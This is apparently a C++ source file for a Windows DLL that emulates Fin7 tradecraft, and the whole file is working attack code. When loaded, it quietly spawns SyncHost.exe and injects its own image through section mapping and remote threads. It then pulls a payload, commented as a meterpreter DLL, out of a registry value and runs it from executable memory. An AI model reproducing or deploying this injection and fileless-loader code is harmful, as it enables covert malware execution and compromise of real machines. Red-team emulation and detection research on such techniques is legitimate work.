// dllmain.cpp : Defines the entry point for the DLL application.

#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <tlhelp32.h>
#include "pe.h"
#include <string>

void EntryPoint();

BOOL APIENTRY DllMain(HMODULE hModule, DWORD call, LPVOID lpReserved) {
	switch (call)
	{
	case DLL_PROCESS_ATTACH:
		EntryPoint();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

//__declspec(dllexport) void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);

namespace Mem {
	void* Copy(void* dst, const void* src, int size)
	{
		if (dst && src && size > 0)
		{
			byte* to = (byte*)dst;
			byte* from = (byte*)src;
			while (size--) *to++ = *from++;
		}
		return dst;
	}
}


extern "C"
{
	NTSTATUS NTAPI ZwMapViewOfSection(
		HANDLE SectionHandle,
		HANDLE ProcessHandle,
		PVOID* BaseAddress,
		ULONG_PTR ZeroBits,
		SIZE_T CommitSize,
		PLARGE_INTEGER SectionOffset,
		PSIZE_T ViewSize,
		SECTION_INHERIT InheritDisposition,
		ULONG AllocationType,
		ULONG Win32Protect
	);


	NTSYSAPI NTSTATUS NTAPI RtlCreateUserThread(
			IN HANDLE               ProcessHandle,
			IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
			IN BOOLEAN              CreateSuspended,
			IN ULONG                StackZeroBits,
			IN OUT PULONG           StackReserved,
			IN OUT PULONG           StackCommit,
			IN PVOID                StartAddress,
			IN PVOID                StartParameter OPTIONAL,
			OUT PHANDLE             ThreadHandle,
			CLIENT_ID* pResult
	);

	BOOL(WINAPI* CreateProcessInternalW)(HANDLE hToken,
		LPCWSTR lpApplicationName,
		LPWSTR lpCommandLine,
		LPSECURITY_ATTRIBUTES lpProcessAttributes,
		LPSECURITY_ATTRIBUTES lpThreadAttributes,
		BOOL bInheritHandles,
		DWORD dwCreationFlags,
		LPVOID lpEnvironment,
		LPCWSTR lpCurrentDirectory,
		LPSTARTUPINFOW lpStartupInfo,
		LPPROCESS_INFORMATION lpProcessInformation,
		PHANDLE hNewToken
		);
}


void EntryPoint(){
	HMODULE hKernel32 = GetModuleHandleA("kernel32");
	CreateProcessInternalW = (BOOL(WINAPI*)(HANDLE, LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION, PHANDLE)) GetProcAddress(hKernel32, "CreateProcessInternalW");
	HANDLE hToken = NULL;
	STARTUPINFOW StartupInfo;
	PROCESS_INFORMATION ProcessInfo;
	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	StartupInfo.cb = sizeof StartupInfo;
	
	// Other candidate donor 32bit executables
	//wbem\\WmiPrvSE.exe
	//PickerHost.exe

	// API to create new process used by Fin7 on SyncHost.exe
	// SyncHost.exe was chosen due to 32bit requirement. SyncHost does not exit after launch making it a good injection target
	if (!CreateProcessInternalW(
		NULL,
		TEXT("C:\\Windows\\SySWOW64\\SyncHost.exe"), // Executable to spawn
		(LPWSTR)TEXT(""),					// Executable args
		NULL,
		NULL,
		FALSE,
		DETACHED_PROCESS | CREATE_NO_WINDOW, // Process creation flags
		NULL,
		NULL,
		&StartupInfo,
		&ProcessInfo,
		&hToken
	)){ 
		
		exit(EXIT_FAILURE);
	}

	if (!ProcessInfo.hProcess)
	{
		
		exit(EXIT_FAILURE);
	}

	// Inject `injectFunc` into spawned process after calling `InjectCode2` to map memory 
	RunInjectCode3(ProcessInfo.hProcess, ProcessInfo.hThread, (typeFuncThread)injectFunc, InjectCode2);

	return;
}

// Function to be injected into a process
DWORD WINAPI injectFunc(void*) {
	HKEY key;
	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\DRM\\", 0, KEY_READ | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS)
	{
		
	}
	else {
		
		return 0;
	}

	BYTE payload[8192]; // Byte buffer for meterpreter dll [5120 bytes]
	DWORD dwType = REG_BINARY;
	DWORD payloadSize = sizeof(payload);
	DWORD dwRet = RegQueryValueExA(key, "4", NULL, &dwType, payload, &payloadSize);
	if (dwRet == ERROR_SUCCESS) {
		
	}
	else {

		return 0;
	}

	RegCloseKey(key);

	// Get handle to current process, and execute payload pulled from registry
	HANDLE hProcess = GetCurrentProcess();
	LPVOID target_payload = VirtualAllocEx(hProcess, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);// Or any other memory allocationtechnique
	WriteProcessMemory(hProcess, target_payload, (LPVOID)&payload, sizeof(payload), NULL);
	((void(*)())target_payload)();

	return 0;
}

// Fin7 memory mapping
SIZE_T InjectCode2(HANDLE hprocess, typeFuncThread startFunc, HMODULE* newBaseImage)
{
	HMODULE imageBase = PE::GetImageBase(startFunc);
	DWORD sizeOfImage = PE::SizeOfImage(imageBase);

	HANDLE hmap = CreateFileMappingA((HANDLE)-1, nullptr, PAGE_EXECUTE_READWRITE, 0, sizeOfImage, nullptr);

	void* view = MapViewOfFile(hmap, FILE_MAP_WRITE, 0, 0, 0);
	if (!view)	return false;

	Mem::Copy(view, (void*)imageBase, sizeOfImage);

	SIZE_T viewSize = 0;
	SIZE_T newBaseAddr = 0;
	SIZE_T addr = 0;

	NTSTATUS status = ZwMapViewOfSection(hmap, hprocess, (PVOID*)&newBaseAddr, 0, sizeOfImage, nullptr, &viewSize, (SECTION_INHERIT)1, 0, PAGE_EXECUTE_READWRITE);

	if (status == STATUS_SUCCESS)
	{

		PIMAGE_DOS_HEADER pdh = (PIMAGE_DOS_HEADER)imageBase;
		PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)((byte*)pdh + pdh->e_lfanew);

		ULONG relRVA = pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		ULONG relSize = pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
		PE::ProcessRelocs((PIMAGE_BASE_RELOCATION)((SIZE_T)imageBase + relRVA), (SIZE_T)view, newBaseAddr - (SIZE_T)imageBase, relSize);

		addr = (SIZE_T)startFunc - (SIZE_T)imageBase + newBaseAddr;
	}

	if (newBaseImage) *newBaseImage = (HMODULE)newBaseAddr;
	UnmapViewOfFile(view);
	CloseHandle(hmap);

	return addr;
}

// Fin7 - Create a new thread from the function that has been mapped into the spawned process
bool RunInjectCode3(HANDLE hprocess, HANDLE hthread, typeFuncThread startFunc, typeInjectCode func)
{
	ADDR addr = func(hprocess, startFunc, 0);
	if (addr == 0) return false;

	DWORD id;
	HANDLE hthread2 = CreateRemoteThread(hprocess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0x0, &id); // 0x0 for start 0x4 suspend

	if (hthread2)
	{
		//ResumeThread(hthread2);
	
		return true;
	}
	else
	{
		HANDLE hthread;
		CLIENT_ID cid;
		if (RtlCreateUserThread(hprocess, nullptr, FALSE, 0, 0, 0, (void*)addr, 0, &hthread, &cid) == STATUS_SUCCESS)
		{
			

			CloseHandle(hthread);
			return true;
		}
		else {
			//(NULL, std::to_wstring(GetLastError()).c_str(), L"RtlCreateUserThread - fail", MB_OK);
		}
	}
	
	return false;
}
